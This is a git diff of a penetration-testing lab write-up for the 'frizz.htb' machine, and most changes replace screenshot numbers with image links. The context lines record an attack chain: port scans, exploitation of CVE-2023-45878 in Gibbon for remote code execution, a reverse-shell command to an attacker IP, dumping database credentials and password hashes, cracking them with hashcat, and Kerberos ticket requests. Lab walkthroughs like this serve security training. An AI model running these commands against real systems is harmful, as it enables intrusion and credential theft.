@@ -14,7 +14,7 @@ ports
 sudo nmap -p- -Pn -n -vv --min-rate=5000 10.129.232.168 -oG network/nmap_ports.txt
 ```
 
-01
+![](screenshots/01.png)
 
 SSH, DNS, HTTP, Kerberos, RPC, LDAP, SMB - Active Directory, Domain Controller
 
@@ -24,12 +24,12 @@ service
 sudo nmap -sCV -p22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49667,49670,62376,62380,62390 --min-rate=5000 10.129.232.168 -oN network/nmap_service.txt
 ```
 
-02a
+![](screenshots/02a.png)
 
 Kerberos time: 2026-09-01 18:09:07
 Domain: frizz.htb
 
-02b
+![](screenshots/02b.png)
 
 SMB signing required, no SMB relay
 
@@ -39,33 +39,36 @@ Unauthenticated enumeration
 nxc smb 10.129.232.168 -u '' -p ''
 ```
 
-03
+![](screenshots/03.png)
 
 NTLM disabled
+
 Hostname: frizzdc
 
 Add IP - Domin/Hostname to /etc/hosts
 
-04
+![](screenshots/04.png)
 
 
 Web
 
 Browsing: http://frizz.htb
 
-05
+![](screenshots/05.png)
 
 School web page, see a login
 
 Scrolling see a encoded string under "Hacking & The Law"
 
-07
+![](screenshots/06.png)
+
+![](screenshots/07.png)
 
 Is base64 encoded. Just a message: "Want to learn hacking but don't want to go to jail? You'll learn the in's and outs of Syscalls and XSS from the safety of international waters and iron clad contracts from your customers, reviewed by Walkerville's finest attorneys."
 
 Following the login button
 
-08
+![](screenshots/08.png)
 
 Gibbon v25.0.00
 Potential user: Fiona Frizzle (f.frizzle, fiona.frizzle ?)
@@ -75,13 +78,15 @@ Clicking on applications there is no function but notice using .php files.
 
 Trying login (admin:admin, etc) notice there is a error message that could be useful for brute forcing.
 
+![](screenshots/09.png)
+
 Enumerating technologies
 
 ```
 whatweb http://frizzdc.frizz.htb
 ```
 
-10
+![](screenshots/10.png)
 
 Apache 2.4.58
 OpneSSL 3.1.3
@@ -115,11 +120,11 @@ Hint: https://www.youtube.com/watch?v=1fCOHQE6A6c. Min 5
 Searching CVEs discovered for the Gibbon (GibbonEdu) framework on cvedetails. He picks [CVE-2023-45878](https://www.cvedetails.com/cve/CVE-2023-45878/ "CVE-2023-45878 security vulnerability details") Which affects 25.0.1, target uses 25.0.0 so should work.
 It seems with this CVE an attacker can write a malicious php file and call it for RCE
 
-11
+![](screenshots/11.png)
 
 I will try to use this automated script: https://github.com/davidzzo23/CVE-2023-45878
 
-12
+![](screenshots/12.png)
 
 The script encodes the php payload, write and call it automatically, also having an option to directly run a PowerShell reverse shell.
 
@@ -133,7 +138,7 @@ Running whoami to test
 python3 CVE-2023-45878.py -t frizz.htb -c "whoami"
 ```
 
-13
+![](screenshots/13.png)
 
 Working. RCE as w.webservice at target system
 
@@ -149,7 +154,7 @@ Run PowerShell reverse shell option
 python3 CVE-2023-45878.py -t frizz.htb -s -i 10.10.15.228 -p 9001
 ```
 
-14
+![](screenshots/14.png)
 
 Got the shell
 
@@ -157,7 +162,7 @@ Got the shell
 whoami;ipconfig
 ```
 
-15
+![](screenshots/15.png)
 
 Enumerating users
 
@@ -165,7 +170,7 @@ Enumerating users
 net users
 ```
 
-16
+![](screenshots/16.png)
 
 A bunch of users. Including f.frizz for fiona as expected. I suppose is a intersting and somewhat privileged account since it seems its the one doing migrations. Saving them to file.
 
@@ -183,7 +188,7 @@ Enumerating administrators
 Get-ADGroupMember -Identity "Administrators"
 ```
 
-17
+![](screenshots/17.png)
 
 v.frizzle is admin
 
@@ -193,7 +198,7 @@ Enumerating RMUs
 Get-ADGroupMember -Identity "Remote Management Users"
 ```
 
-18
+![](screenshots/18.png)
 
 m.schoolbus and f.frizzle are members of Remote Mnagement Users (SSH)
 
@@ -203,13 +208,13 @@ Referenced: https://www.youtube.com/watch?v=1fCOHQE6A6c. Min 11
 
 Reading the web config file
 
-19
+![](screenshots/19.png)
 
 ```Powershell
 type config.php
 ```
 
-20
+![](screenshots/20.png)
 
 Username: MrGibbonsDB
 Password: MisterGibbs!Parrot!?1
@@ -224,7 +229,7 @@ cd \xampp\mysql\bin
 .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'show tables'
 ```
 
-21
+![](screenshots/21.png)
 
 gibbonperson is the intersting table
 
@@ -232,7 +237,7 @@ gibbonperson is the intersting table
 .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'describe gibbonperson'
 ```
 
-22
+![](screenshots/22.png)
 
 Interesting fields
 - username
@@ -243,7 +248,7 @@ Interesting fields
 .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'select username, passwordStrong, passwordStrongSalt from gibbonperson'
 ```
 
-23
+![](screenshots/23.png)
 
 username: f.frizzle
 password (hash): 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
@@ -261,7 +266,7 @@ Asking hascat to print possible modes for the hash
 hashcat --username frizz.htb.f.frizzle.hash
 ```
 
-24
+![](screenshots/24.png)
 
 It seems 1420 is what it wants. I would have chose 1410 since the hash is pass:salt and not the other way (salt:hash)...
 
@@ -269,7 +274,7 @@ It seems 1420 is what it wants. I would have chose 1410 since the hash is pass:s
 hashcat -m 1420 --username frizz.htb.f.frizzle.hash /opt/tools/wordlists/rockyou.txt
 ```
 
-25
+![](screenshots/25.png)
 
 Cracked: Jenni_Luvs_Magic23
 
@@ -301,7 +306,7 @@ Running rusthound-ce
 rusthound-ce -d frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -f frizzdc -z
 ```
 
-26
+![](screenshots/26.png)
 
 Need rest. End: 2026-09-01, 15:00
 
@@ -314,9 +319,9 @@ Upload .zip file
 Add controlled users to owned objects
 Query "Shortest Paths from Owned objects"
 
-27
+![](screenshots/27.png)
 
-Nothing interesting, just member of Remote Management Users as saw earlier
+Overall nothing interesting, just member of Remote Management Users as saw earlier
 
 Trying to connect with SSH
 
@@ -324,7 +329,7 @@ Trying to connect with SSH
 ssh f.frizzle@frizzdc.frizz.htb
 ```
 
-28
+![](screenshots/28.png)
 
 Ran more queries but nothing stands out
 
@@ -332,19 +337,19 @@ Referenced: https://www.youtube.com/watch?v=1fCOHQE6A6c. Min 23
 
 Since the target DC enforces kerberos auth, I need to get a TGT to use as authentication for SSH. Besides, it seems to need the fully qualified name (frizzdc.frizz.htb) first on the /etc/hosts reference for DNS resolution.
 
-29
+![](screenshots/29.png)
 
 ```
 getTGT.py FRIZZ.HTB/f.frizzle:Jenni_Luvs_Magic23
 ```
 
-30
+![](screenshots/30.png)
 
 ```
 KRB5CCNAME=f.frizzle.ccache ssh -K f.frizzle@10.129.232.168 -v
 ```
 
-31
+![](screenshots/31.png)
 
 Using "fully qualified" name or domain hangs up thinking, no verbose.
 Tried getting new TGT, sync to DC again, using hostname, domain, IP, ... nothing.
@@ -356,10 +361,9 @@ End: 2026-09-01, 17:15
 ---
 #### Post testing
 ##### Time frame
-Start: 2026-09-01, 12:10
-End: 2026-09-01, 15:00
-Start: 2026-09-01 16:30
-End: 2026-09-01, 17:15
+Start: 2026-09-01, 12:10 - End: 2026-09-01, 15:00
+
+Start: 2026-09-01 16:30 - End: 2026-09-01, 17:15
 
 Total time: 3h 35min
 
@@ -371,9 +375,9 @@ Total time: 3h 35min
 - Using SSH with kerberos authentication and DC DNS quirk
 
 #### Sources
-Gibbson CVE: https://www.cvedetails.com/cve/CVE-2023-45878/
-CVE exploit/PoC: https://github.com/davidzzo23/CVE-2023-45878/tree/main
-IppSec video reference: https://www.youtube.com/watch?v=1fCOHQE6A6c
+- Gibbson CVE: https://www.cvedetails.com/cve/CVE-2023-45878/
+- CVE exploit/PoC: https://github.com/davidzzo23/CVE-2023-45878/tree/main
+- IppSec video reference: https://www.youtube.com/watch?v=1fCOHQE6A6c
 
 
 ##### Techniques
